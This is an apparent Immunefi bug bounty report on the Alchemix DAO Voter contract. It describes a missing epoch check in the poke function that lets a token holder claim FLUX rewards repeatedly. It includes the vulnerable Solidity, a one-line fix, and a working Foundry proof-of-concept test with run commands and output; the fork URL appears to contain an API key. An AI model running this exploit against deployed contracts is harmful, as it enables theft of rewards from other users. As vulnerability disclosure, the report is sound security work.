# 31196 - \[SC - Critical] Voterpoke does not check lastVoted resulting in...

Submitted on May 14th 2024 at 19:38:20 UTC by @yttriumzz for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31196

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

In AlchemixDAO, each $veToken can vote once per epoch, and users can receive $FLUX as a reward after voting. However, the `Voter.poke` interface allows users to easily repeat previous votes without check whether the $veToken has already voted in the current epoch. As a result, users can call the poke interface infinitely to receive $FLUX repeatedly.

## Vulnerability Details

Please see the following code. The `Voter.vote` interface uses the `onlyNewEpoch` modifier to check whether $veToken has voted in the current epoch.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L228-L233
    function vote(
        uint256 _tokenId,
        address[] calldata _poolVote,
        uint256[] calldata _weights,
        uint256 _boost
    ) external onlyNewEpoch(_tokenId) {
```

However, the `Voter.poke` interface, which also has the voting function, does not check `lastVoted`, causing users to call the interface repeatedly.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L195-L212
    function poke(uint256 _tokenId) public {
        // Previous boost will be taken into account with weights being pulled from the votes mapping
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);
    }
```

**Suggested fix**

Check the `lastVoted` of the token.

```diff
-   function poke(uint256 _tokenId) public {
+   function poke(uint256 _tokenId) public onlyNewEpoch(_tokenId) {
        // Previous boost will be taken into account with weights being pulled from the votes mapping
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);
    }
```

## Impact Details

Users can infinitely copy $FLUX causing Alchemix token economics to collapse.

## References

None

## Proof of Concept

The PoC patch

```solidity
diff --git a/src/test/Voting.t.sol b/src/test/Voting.t.sol
index 3f1cc5a..c71a697 100644
--- a/src/test/Voting.t.sol
+++ b/src/test/Voting.t.sol
@@ -1562,4 +1562,28 @@ contract VotingTest is BaseTest {
         hevm.expectRevert(abi.encodePacked("invalid pools"));
         voter.vote(tokenId, pools2, weights3, 0);
     }
+
+    function testYttriumzzPocTemp() public {
+        hevm.startPrank(admin);
+
+        uint256 tokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
+
+        console.log(">>>>> before steal");
+        console.log(">> flux.balanceOf(admin): %s", flux.balanceOf(admin));
+        console.log();
+
+        console.log(">>>>> steal 100 times");
+        for (uint256 i = 0; i < 100; i++) { voter.poke(tokenId); }
+        flux.claimFlux(tokenId, flux.getUnclaimedFlux(tokenId));
+        console.log(">> flux.balanceOf(admin): %s", flux.balanceOf(admin));
+        console.log();
+
+        console.log(">>>>> steal 100 times");
+        for (uint256 i = 0; i < 100; i++) { voter.poke(tokenId); }
+        flux.claimFlux(tokenId, flux.getUnclaimedFlux(tokenId));
+        console.log(">> flux.balanceOf(admin): %s", flux.balanceOf(admin));
+        console.log();
+
+        hevm.stopPrank();
+    }
 }
```

Run the PoC

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
```

The log

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/Voting.t.sol:VotingTest
[PASS] testYttriumzzPocTemp() (gas: 4897718)
Logs:
  >>>>> before steal
  >> flux.balanceOf(admin): 0
  
  >>>>> steal 100 times
  >> flux.balanceOf(admin): 99725916412156217700
  
  >>>>> steal 100 times
  >> flux.balanceOf(admin): 199451832824312435400
  

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 61.62ms (46.36ms CPU time)

Ran 1 test suite in 1.68s (61.62ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
